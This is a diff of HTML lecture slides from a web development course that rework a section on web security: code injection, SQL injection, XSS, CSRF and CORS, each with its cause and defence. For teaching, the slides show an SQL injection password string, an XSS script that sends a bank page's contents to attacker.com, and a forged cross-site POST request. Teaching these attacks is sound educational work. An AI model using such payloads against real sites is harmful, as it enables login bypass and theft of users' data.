     </h2>
     <ul>
       <li class="next">
-        Browsers send a <code>Cookie</code> header with requests,<br>
-        yielding a possibly personalized version of a page.
-        <ul>
-          <li>
-            In your browser, <em>facebook.com</em>
-            reveals more than with cURL.
-          </li>
-        </ul>
+        Protocol-level security only guarantees privacy and integrity
+        from one endpoint to another.
       </li>
       <li class="next">
-        If any site could request any URL,<br>
-        your personal data would not be safe.
+        The Web evolved from a document system
+        to a distributed application platform.
       </li>
       <li class="next">
-        By default, scripts can only access resources<br>
-        with URLs from the same domain <em>(“origin”)</em>.
-        <ul>
-          <li>Merely <em>embedding</em> files from other domains is fine though.</li>
-        </ul>
+        Applications themselves also need<br>
+        mechanisms to secure information.
       </li>
     </ul>
   </div>
 
-  <div class="slide" id="cors">
+  <div class="slide" id="attacks">
     <h2>
-      Servers can bypass origin restrictions with<br>
-      <a href="http://enable-cors.org/">Cross-Origin Resource Sharing (CORS)</a>.
+      We will examine 3 common attack types<br>
+      and how to defend against them.
     </h2>
-    <ul>
-      <li class="next">
-        Servers add an <a href="https://www.w3.org/TR/cors/#access-control-allow-origin-response-header"><code>Access-Control-Allow-Origin</code></a><br>
-        header to responses.
-        <ul>
-          <li><code>Access-Control-Allow-Origin: *</code></li>
-          <li><code>Access-Control-Allow-Origin: http://perdu.com</code></li>
-        </ul>
-      </li>
-      <li class="next">
-        Browsers add an <a href="https://www.w3.org/TR/cors/#origin-request-header"><code>Origin</code></a> header to requests.
-        <ul>
-          <li><code>Origin: http://perdu.com</code></li>
-        </ul>
-      </li>
-      <li class="next">
-        Scripts can access responses with matching headers.
-        <ul>
-          <li>With non-safe methods,
-              the browser <a href="https://www.w3.org/TR/cors/#cross-origin-request-with-preflight-0">tries <code>OPTIONS</code> first</a>.</li>
-        </ul>
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="xss">
-    <h2>
-      <em>Cross-site scripting</em> allows<br>
-      attackers to inject code.
-    </h2>
-    <ul>
-      <li class="next">
-        A site could trick users into submitting a form<br>
-        that directs its output to another site.
-        <ul class="inline">
-          <li>modify an item</li>
-          <li>delete an item</li>
-          <li>…</li>
-        </ul>
-      </li>
-      <li class="next">
-        Code can be injected into sites<br>
-        that don't properly escape HTML tags.
-        <ul>
-          <li><em>http://example.org/hello-world?name=Ruben+&lt;script&gt;alert('hello');&lt;/script&gt;</em></li>
-        </ul>
-      </li>
-      <li class="next">
-        Origin protection does not help with such cases.
-      </li>
-    </ul>
+    <dl>
+      <dt><a href="#code-injection">code injection</a></dt>
+      <dd>executing malicious scripts on the server</dd>
+      <dt><a href="#xss">cross-site scripting</a></dt>
+      <dd>executing malicious scripts on the client</dd>
+      <dt><a href="#cross-origin-access">cross-origin access</a></dt>
+      <dd>accessing information from other websites</dd>
+    </dl>
   </div>
 
   <div class="slide" id="code-injection">
     <h2>
-      <em>Code injection</em> can occur when<br>
-      user inputs are not sanitized.
+      With code injection, clients send input<br>
+      designed to execute on the server.
     </h2>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">executable code passed in an URL or <code>POST</code> body parameter</dd>
+      <dt>cause</dt>
+      <dd class="next">improper input validation by the server</dd>
+      <dt>defense</dt>
+      <dd class="next"><em>never</em> trust raw client input</dd>
+      <dd class="next">validate input ranges</dd>
+      <dd class="next">escape values before passing to scripts</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="sql-injection">
+    <h2>
+      SQL injection used to be<br>
+      a very common type of attack.
+    </h2>
+    <h3>Server-side code</h3>
+    <pre><code>query = "SELECT id FROM User WHERE name='" + name + '" +
+        " AND password='" + password + '";</code></pre>
+    <h3>Client-side code</h3>
+    <p class="next">
+      <label>username</label>
+      <input class="small" value="admin">
+      <label>password</label>
+      <input class="small" value="' OR ''='">
+    </p>
+    <h3>Result</h3>
+    <pre class="next"><code>SELECT id FROM User <strong>WHERE name='admin'</strong>
+                    <strong>AND</strong> password='' OR <strong>''=''</strong>;</code></pre>
+  </div>
+
+  <div class="slide" id="server-side-validation">
+    <h2>
+      Client-side validation <em>only</em> offers usability;<br>
+      servers <em>always</em> need to (re-)validate.
+    </h2>
+    <h3>Client-side form</h3>
+    <p>
+      <label>role</label>
+      <select name="role">
+        <option value="1" disabled>admin</option>
+        <option value="2">user</option>
+        <option value="3">developer</option>
+      </select>
+    </p>
+    <h3>Ways to bypass</h3>
     <ul>
-      <li>
-        <em>Never</em> trust input from clients.
-        <ul>
-          <li class="next">Apply strict validation rules.</li>
-          <li class="next">Escape special characters for specific languages.</li>
-        </ul>
-      </li>
-      <li class="next">
-        <em>Always</em> apply server-side validation.
-        <ul>
-          <li>Only <em>client</em>-side validation is optional.</li>
-        </ul>
-      </li>
-      <li class="next">
-        Unescaped input can lead to execution<br>
-        of code chosen by the client on the server.
-        <ul>
-          <li>With <em>SQL injection</em>, users can modify queries and/or data.</li>
-        </ul>
-      </li>
+      <li class="next">change the HTML at runtime</li>
+      <li class="next">construct the HTTP request in another way</li>
     </ul>
   </div>
 
@@ -2189,22 +1956,123 @@ input.onkeyup = function () {
     </figure>
   </div>
 
-  <div class="slide" id="sql-injection">
+  <div class="slide" id="xss">
     <h2>
-      SQL injection was a popular mechanism<br>
-      to gain unauthorized access to websites.
+      With Cross-Site Scripting (XSS), a <em>client-side</em> script
+      steals information from a webpage.
     </h2>
-    <p>
-      If a server created this query without escaping
-    </p>
-    <pre><code>query = 'SELECT id FROM User WHERE name="' + name + '"' +
-        ' AND password="' + password + '"'</code></pre>
-    <p class="next">
-      then you can log in with any username using<br>
-      <code>" OR ""="</code> as password, because the query becomes
-    </p>
-    <pre class="next"><code>SELECT id FROM User WHERE name="admin"
-                      AND <strong>password="" OR ""=""</strong></code></pre>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">trick another site into executing code in its own space,
+                       exposing or changing user data</dd>
+      <dt>causes</dt>
+      <dd class="next">improper input validation</dd>
+      <dd class="next">trusting third-party content</dd>
+      <dd class="next">social engineering</dd>
+      <dt>defense</dt>
+      <dd class="next">validate input</dd>
+      <dd class="next">add token field on forms</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="xss-injection">
+    <h2>
+      Injecting JavaScript in pages<br>
+      can steal a user’s personal data.
+    </h2>
+    <h3>Original page echoes <code>assets</code> in contents</h3>
+    <pre><code>https://mybank.com/onlinebanking/?search=assets</code></pre>
+    <h3>Attack code</h3>
+    <pre class="next"><code>(xhr = new XMLHttpRequest()).open('GET',
+  'http://attacker.com/?data=' + document.body.innerHTML);
+xhr.send(null);</code></pre>
+    <h3>Modified URL echoes the attack code in contents</h3>
+    <pre class="next"><code>https://mybank.com/onlinebanking/?search=<ins>%3Cscript%3E(xhr%20%3D%20new</ins></code></pre>
+  </div>
+
+  <div class="slide" id="xss-form">
+    <h2>
+      Submitting a form to another side<br>
+      can execute actions on a user's behalf.
+    </h2>
+    <h3>Attack code placed on third-party website</h3>
+    <pre class="next"><code>(xhr = new XMLHttpRequest()).open('POST',
+  'http://reddit.com/?message=Cheap%20Pills%20For%20Sale');
+xhr.send(null);</code></pre>
+    <h3 class="next">Cross-Site Request Forgery (CSRF) Prevention</h3>
+    <pre class="next"><code>&lt;input name="csrf" type=&quot;hidden&quot; value=&quot;XVduuls7&quot; /&gt;
+&lt;input name="message" type=&quot;text&quot;/&gt;</code></pre>
+  </div>
+
+  <div class="slide" id="cross-origin-access">
+    <h2>
+      With cross-origin access, a page requests
+      third-party resources through JavaScript.
+    </h2>
+    <dl>
+      <dt>attack</dt>
+      <dd class="next">request resources from another site with JavaScript and read their contents</dd>
+      <dt>causes</dt>
+      <dd class="next">the existence of <code>XMLHttpRequest</code></dd>
+      <dd class="next">being logged in on another website</dd>
+      <dt>defense</dt>
+      <dd class="next">browsers block cross-origin requests by default</dd>
+    </dl>
+  </div>
+
+  <div class="slide" id="cross-origin-why">
+    <h2>
+      Cross-origin requests are a problem<br>
+      within browsers only.
+    </h2>
+    <ul>
+      <li>
+        Nothing happens when any other script or app<br>
+        requests <code>https://mybank.com/onlinebanking/</code>.
+        <ul class="next">
+          <li>You are not logged in—there are no cookies.</li>
+        </ul>
+      </li>
+      <li>
+        When the browser requests that page,<br>
+        the page might contain personal information.
+        <ul class="next">
+          <li>You might be logged in—browsers maintain cookies.</li>
+        </ul>
+      </li>
+      <li class="next">
+        As a result, browsers block cross-origin requests.
+        <ul>
+          <li>an <em>origin</em> more or less corresponds to a <em>domain</em></li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="cors">
+    <h2>
+      <a href="https://www.w3.org/TR/cors/">Cross-Origin Resource Sharing (CORS)</a>
+      enables others to access your pages.
+    </h2>
+    <ul>
+      <li class="next">
+        Activate CORS to enable <a href="./web-apis/">Web APIs</a> access
+        from within other browser-based Web applications.
+      </li>
+      <li class="next">
+        The browser adds an <code>Origin</code> header to requests.
+        <ul>
+          <li><code>Origin: https://my.site</code></li>
+        </ul>
+      </li>
+      <li class="next">
+        If the server allows requests from that origin,<br>
+        it adds <code>Access-Control-Allow-Origin</code>.
+        <ul>
+          <li><code>Access-Control-Allow-Origin: https://my.site</code></li>
+        </ul>
+      </li>
+    </ul>
   </div>
 
   <div class="toc slide" id="recap">
@@ -2215,7 +2083,7 @@ input.onkeyup = function () {
     <ul>
       <li><a href="#core">Core Web Standards</a></li>
       <li><a href="#architecture">Web Architecture</a></li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
